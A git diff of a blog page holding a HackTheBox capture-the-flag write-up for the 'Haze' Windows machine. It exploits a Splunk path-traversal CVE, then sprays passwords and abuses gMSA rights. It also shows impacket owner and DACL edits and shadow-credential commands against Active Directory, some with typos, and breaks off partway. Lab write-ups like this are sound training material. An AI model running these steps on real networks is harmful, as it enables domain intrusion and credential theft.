@@ -48,14 +48,6 @@
 <main class="page-content" aria-label="Content">
       <div class="wrapper">
         
-  <div class="author-box">
-
-<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
-</div>
-
-</div>
-
-
 <div class="post">
   <h1 class="post-title">Haze-Windows-Hard</h1>
   
@@ -67,232 +59,237 @@
   <h1 id="haze">Haze</h1>
 
 <h1 id="1-enumeration">1. Enumeration</h1>
-
-<p>Start port enumeration</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image.png" alt="image.png" /></p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_1.png" alt="image.png" /></p>
-
-<p>Splunk web service is running on port 8000, a login form is displayed but we don’t have any credentials yet</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_2.png" alt="image.png" /></p>
-
+<p><br /><br />
+Start port enumeration
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image.png" alt="image.png" />
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_1.png" alt="image.png" />
+<br /><br />
+Splunk web service is running on port 8000, a login form is displayed but we don’t have any credentials yet
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_2.png" alt="image.png" />
+<br /><br /></p>
 <h1 id="2-user-flag">2. User flag</h1>
-
-<p>Search the internet to identify vulnerabilities like CVE-2024-36991. Arbitrary file read through reverse path traversal, this is possible thanks to <code class="language-plaintext highlighter-rouge">os.path.join</code> which concatenates the whole path ignoring any part of the string that includes a drive letter (<code class="language-plaintext highlighter-rouge">c:</code> in this case)</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_3.png" alt="image.png" /></p>
-
-<p>The next payload will be processed by the function and it will take the first <code class="language-plaintext highlighter-rouge">C:</code> probably located in the backend and it will ignore any other <code class="language-plaintext highlighter-rouge">C:</code> references treating the next as part of the path, in this way, path traversal filtering will be bypassed disclosing files outside the current directory</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_4.png" alt="image.png" /></p>
-
-<p>Check <code class="language-plaintext highlighter-rouge">/etc/passwd</code> to confirm this environment is vulnerable, some hashes were found but they are not easy crackeable</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_5.png" alt="image.png" /></p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_6.png" alt="image.png" /></p>
-
-<p>Chat-gpt helps us to locate interesting taking advantage of splunk</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_7.png" alt="image.png" /></p>
-
-<p>The secret is disclosed, now we need hashes to crack with this secret</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_8.png" alt="image.png" /></p>
-
-<p>In the configuration files we will discover some hashes</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_9.png" alt="image.png" /></p>
-
-<p>However, only in the authentication file does a hash have a Common Name</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_10.png" alt="image.png" /></p>
-
-<p>Use <code class="language-plaintext highlighter-rouge">splunksecrets</code> tool to decrypt the hash found using the secret disclosed</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_11.png" alt="image.png" /></p>
-
-<p>Make sure that this password is valid on ldap authentication</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_12.png" alt="image.png" /></p>
-
-<p>It’s time to enumerate user in the domain</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_13.png" alt="image.png" /></p>
-
-<p>Use those users to spray the password</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_14.png" alt="image.png" /></p>
-
-<p><code class="language-plaintext highlighter-rouge">mark.adams</code> is also using the same password, we can check if there are any useful share to obtain more information but this step did not succeed</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_15.png" alt="image.png" /></p>
-
-<p>Those credentials might be convenient for enumerating the entire domain using <code class="language-plaintext highlighter-rouge">bloodhound-python</code></p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_16.png" alt="image.png" /></p>
-
-<p><code class="language-plaintext highlighter-rouge">Mark.adams</code> account is member of <code class="language-plaintext highlighter-rouge">GMSA_MANAGERS</code> group</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_17.png" alt="image.png" /></p>
-
-<p>We can confirm that using Powershell</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_18.png" alt="image.png" /></p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_19.png" alt="image.png" /></p>
-
-<p>Attackers can abuse misconfigured gMSA to escalate privileges. This group (Group Managed Service Account) are assigned to automate password rotation but  only specific accounts should have <code class="language-plaintext highlighter-rouge">readgMSApassword</code> privilege, in this scenario we have compromised a gMSA manager’s member.</p>
-
-<p>Bloodhound did not display members of gMSA. To enumerate users in the domain and identify which accounts can retrieve gMSA passwords or modify its properties, we can execute the following commands:</p>
-
+<p><br /><br />
+Search the internet to identify vulnerabilities like CVE-2024-36991. Arbitrary file read through reverse path traversal, this is possible thanks to <code class="language-plaintext highlighter-rouge">os.path.join</code> which concatenates the whole path ignoring any part of the string that includes a drive letter (<code class="language-plaintext highlighter-rouge">c:</code> in this case) 
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_3.png" alt="image.png" />
+<br /><br />
+The next payload will be processed by the function and it will take the first <code class="language-plaintext highlighter-rouge">C:</code> probably located in the backend and it will ignore any other <code class="language-plaintext highlighter-rouge">C:</code> references treating the next as part of the path, in this way, path traversal filtering will be bypassed disclosing files outside the current directory
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_4.png" alt="image.png" />
+<br /><br />
+Check <code class="language-plaintext highlighter-rouge">/etc/passwd</code> to confirm this environment is vulnerable, some hashes were found but they are not easy crackeable
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_5.png" alt="image.png" />
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_6.png" alt="image.png" />
+<br /><br />
+Chat-gpt helps us to locate interesting taking advantage of splunk
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_7.png" alt="image.png" />
+<br /><br />
+The secret is disclosed, now we need hashes to crack with this secret
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_8.png" alt="image.png" />
+<br /><br />
+In the configuration files we will discover some hashes
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_9.png" alt="image.png" />
+<br /><br />
+However, only in the authentication file does a hash have a Common Name
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_10.png" alt="image.png" />
+<br /><br />
+Use <code class="language-plaintext highlighter-rouge">splunksecrets</code> tool to decrypt the hash found using the secret disclosed
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_11.png" alt="image.png" />
+<br /><br />
+Make sure that this password is valid on ldap authentication
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_12.png" alt="image.png" />
+<br /><br />
+It’s time to enumerate user in the domain
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_13.png" alt="image.png" />
+<br /><br />
+Use those users to spray the password
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_14.png" alt="image.png" />
+<br /><br />
+<code class="language-plaintext highlighter-rouge">mark.adams</code> is also using the same password, we can check if there are any useful share to obtain more information but this step did not succeed
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_15.png" alt="image.png" />
+<br /><br />
+Those credentials might be convenient for enumerating the entire domain using <code class="language-plaintext highlighter-rouge">bloodhound-python</code>
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_16.png" alt="image.png" />
+<br /><br />
+<code class="language-plaintext highlighter-rouge">Mark.adams</code> account is member of <code class="language-plaintext highlighter-rouge">GMSA_MANAGERS</code> group
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_17.png" alt="image.png" />
+<br /><br />
+We can confirm that using Powershell
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_18.png" alt="image.png" />
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_19.png" alt="image.png" />
+<br /><br />
+Attackers can abuse misconfigured gMSA to escalate privileges. This group (Group Managed Service Account) are assigned to automate password rotation but  only specific accounts should have <code class="language-plaintext highlighter-rouge">readgMSApassword</code> privilege, in this scenario we have compromised a gMSA manager’s member.
+<br /><br />
+Bloodhound did not display members of gMSA. To enumerate users in the domain and identify which accounts can retrieve gMSA passwords or modify its properties, we can execute the following commands:
+<br /><br /></p>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get</span><span class="o">-</span><span class="n">ADServiceAccount</span> <span class="o">-</span><span class="n">Filter</span> <span class="o">*</span>
 <span class="n">Get</span><span class="o">-</span><span class="n">ADServiceAcount</span> <span class="n">Haze</span><span class="o">-</span><span class="n">IT</span><span class="o">-</span><span class="n">Backup</span> <span class="o">-</span><span class="n">Property</span> <span class="n">PrincipalsAllowedToRetrieveManagedPassword</span>
 <span class="c1">#Who can modify this property?
 </span><span class="err">$</span><span class="n">backupuser</span> <span class="o">=</span> <span class="n">Get</span><span class="o">-</span><span class="n">ADServiceAccount</span> <span class="n">Haze</span><span class="o">-</span><span class="n">IT</span><span class="o">-</span><span class="n">Backup</span>
 <span class="p">(</span><span class="n">Get</span><span class="o">-</span><span class="n">Acl</span> <span class="s">"AD:\$($backupuser.DistinguishedName)"</span><span class="p">).</span><span class="n">Access</span> <span class="o">|</span> <span class="n">Where</span><span class="o">-</span><span class="n">Object</span> <span class="p">{</span><span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">IdentityReference</span> <span class="o">-</span><span class="n">like</span> <span class="s">'*gMSA_Manage'</span><span class="p">}</span>
 </code></pre></div></div>
-
-<p>Other options to shortcut this enumeration could be:</p>
-
+<p><br /><br />
+Other options to shortcut this enumeration could be:
+<br /><br /></p>
 <ul>
   <li><code class="language-plaintext highlighter-rouge">get writeables</code> in <code class="language-plaintext highlighter-rouge">bloodyAD</code></li>
-  <li>Find-<code class="language-plaintext highlighter-rouge">InterestingDomainAcl</code> in <code class="language-plaintext highlighter-rouge">PowerView.ps1</code> module</li>
-</ul>
-
-<p>Once we know gMSA managers can set Haze-IT-Backup property to retrieve its managed password we proceed to abuse this</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set</span><span class="o">-</span><span class="n">ADServiceAccount</span> <span class="o">-</span><span class="n">Identity</span> <span class="s">"Haze-IT-Backup"</span> <span class="o">-</span><span class="n">PrincipalsAllowedToRetrieveManagedPassword</span> <span class="s">"mark.adams"</span>
-</code></pre></div></div>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_20.png" alt="image.png" /></p>
-
-<p>This misconfiguration can be leverage to obtain the NTLM hash of the backup account</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nxc</span> <span class="n">ldap</span> <span class="n">ip</span> <span class="o">-</span><span class="n">u</span> <span class="n">user</span> <span class="o">-</span><span class="n">p</span> <span class="n">password</span> <span class="o">--</span><span class="n">gmsa</span>
-</code></pre></div></div>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_21.png" alt="image.png" /></p>
-
-<p>Haze-IT-Backup has WriteOwner permissions over support_services group, but seems to be something else to investigate</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_22.png" alt="image.png" /></p>
-
-<p>Execute the <code class="language-plaintext highlighter-rouge">bloodhound-python</code> collector again, this time using backup user’s credentials</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_23.png" alt="image.png" /></p>
-
-<p>Now the path forward is clearer</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_24.png" alt="image.png" /></p>
-
-<p>Set <code class="language-plaintext highlighter-rouge">haze-it-backup</code> as the new owner of <code class="language-plaintext highlighter-rouge">support_services</code> and grant it <code class="language-plaintext highlighter-rouge">full-control</code> over the group</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">impacker</span><span class="o">-</span><span class="n">owneredit</span> <span class="o">-</span><span class="n">action</span> <span class="n">write</span> <span class="o">-</span><span class="n">new</span><span class="o">-</span><span class="n">owner</span> <span class="s">'new-owner'</span> <span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">dn</span> <span class="s">'target-dn'</span> <span class="s">'domain'</span><span class="o">/</span><span class="s">'user'</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="k">pass</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="nb">hash</span>
+  <li>Find-<code class="language-plaintext highlighter-rouge">InterestingDomainAcl</code> in <code class="language-plaintext highlighter-rouge">PowerView.ps1</code> module
+<br /><br />
+Once we know gMSA managers can set Haze-IT-Backup property to retrieve its managed password we proceed to abuse this
+<br /><br />
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set</span><span class="o">-</span><span class="n">ADServiceAccount</span> <span class="o">-</span><span class="n">Identity</span> <span class="s">"Haze-IT-Backup"</span> <span class="o">-</span><span class="n">PrincipalsAllowedToRetrieveManagedPassword</span> <span class="s">"mark.adams"</span>
+</code></pre></div>    </div>
+    <p><br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_20.png" alt="image.png" />
+<br /><br />
+This misconfiguration can be leverage to obtain the NTLM hash of the backup account
+<br /><br /></p>
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nxc</span> <span class="n">ldap</span> <span class="n">ip</span> <span class="o">-</span><span class="n">u</span> <span class="n">user</span> <span class="o">-</span><span class="n">p</span> <span class="n">password</span> <span class="o">--</span><span class="n">gmsa</span>
+</code></pre></div>    </div>
+    <p><br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_21.png" alt="image.png" />
+<br /><br />
+Haze-IT-Backup has WriteOwner permissions over support_services group, but seems to be something else to investigate
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_22.png" alt="image.png" />
+<br /><br />
+Execute the <code class="language-plaintext highlighter-rouge">bloodhound-python</code> collector again, this time using backup user’s credentials
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_23.png" alt="image.png" />
+<br /><br />
+Now the path forward is clearer
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_24.png" alt="image.png" />
+<br /><br />
+Set <code class="language-plaintext highlighter-rouge">haze-it-backup</code> as the new owner of <code class="language-plaintext highlighter-rouge">support_services</code> and grant it <code class="language-plaintext highlighter-rouge">full-control</code> over the group
+<br /><br /></p>
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">impacker</span><span class="o">-</span><span class="n">owneredit</span> <span class="o">-</span><span class="n">action</span> <span class="n">write</span> <span class="o">-</span><span class="n">new</span><span class="o">-</span><span class="n">owner</span> <span class="s">'new-owner'</span> <span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">dn</span> <span class="s">'target-dn'</span> <span class="s">'domain'</span><span class="o">/</span><span class="s">'user'</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="k">pass</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="nb">hash</span>
 <span class="n">impacket</span><span class="o">-</span><span class="n">dacledit</span> <span class="o">-</span><span class="n">action</span> <span class="n">write</span> <span class="o">-</span><span class="n">rights</span> <span class="n">FullControl</span> <span class="o">-</span><span class="n">principal</span> <span class="s">'attacker'</span> <span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">dn</span> <span class="s">'target-dn'</span> <span class="s">'domain'</span><span class="o">/</span><span class="s">'user'</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="k">pass</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="nb">hash</span>
 <span class="c1">#Or without imapcket 
 </span><span class="n">pth</span><span class="o">-</span><span class="n">net</span> <span class="n">rpc</span> <span class="n">group</span> <span class="n">addmem</span> <span class="s">"SUPPORT_SERVICE"</span> <span class="n">attackeruser</span> <span class="o">-</span><span class="n">U</span> <span class="s">'domain'</span><span class="o">/</span><span class="s">'attacker'</span><span class="o">%</span><span class="s">'fffto_supply_right_format'</span><span class="p">:</span><span class="s">'hash'</span> <span class="o">-</span><span class="n">S</span> <span class="n">ip</span>
-</code></pre></div></div>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_25.png" alt="image.png" /></p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_26.png" alt="image.png" /></p>
-
-<p>We have three options right now:</p>
-
-<ul>
-  <li>Change edward.martin password’s (Faster but not a clean OPSEC, and not allowed in this machine)</li>
-  <li>Request a TGT again and use certipy shadow credential to obtain edward hash (Automated and faster)</li>
-  <li>Using pywhisker → gettgtpkinit → getnthash (A manual and more granular approach)</li>
-</ul>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#To update msDS-KeyCredentialLink and obtain a PFX from this link
+</code></pre></div>    </div>
+    <p><br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_25.png" alt="image.png" />
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_26.png" alt="image.png" />
+<br /><br />
+We have three options right now:
+<br /><br /></p>
+  </li>
+  <li>Change edward.martin password’s (Faster but not a clean OPSEC, and not allowed in this machine)
+<br /><br /></li>
+  <li>Request a TGT again and use certipy shadow credential to obtain edward hash (Automated and faster)
+<br /><br /></li>
+  <li>Using pywhisker → gettgtpkinit → getnthash (A manual and more granular approach)
+<br /><br />
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#To update msDS-KeyCredentialLink and obtain a PFX from this link
 </span><span class="n">python3</span> <span class="n">pywhisker</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="s">'attacker'</span> <span class="o">-</span><span class="n">H</span> <span class="p">:</span><span class="nb">hash</span> <span class="o">-</span><span class="n">d</span> <span class="n">domain</span> <span class="o">-</span><span class="n">t</span> <span class="s">'target'</span> <span class="o">-</span><span class="n">a</span> <span class="n">add</span>
-</code></pre></div></div>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_27.png" alt="image.png" /></p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#Get a tgt using the PFX file generated previously
+</code></pre></div>    </div>
+    <p><br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_27.png" alt="image.png" />
+<br /><br /></p>
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#Get a tgt using the PFX file generated previously
 </span><span class="n">python</span> <span class="n">gettgtpkinit</span> <span class="o">-</span><span class="n">cert</span><span class="o">-</span><span class="n">pfx</span> <span class="p">.</span><span class="n">pxf</span> <span class="o">-</span><span class="n">pfx</span><span class="o">-</span><span class="k">pass</span> <span class="n">pfxpass</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="n">ip</span> <span class="n">domain</span><span class="o">/</span><span class="n">target</span> <span class="n">target</span><span class="p">.</span><span class="n">ccfile</span>
-</code></pre></div></div>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_28.png" alt="image.png" /></p>
-
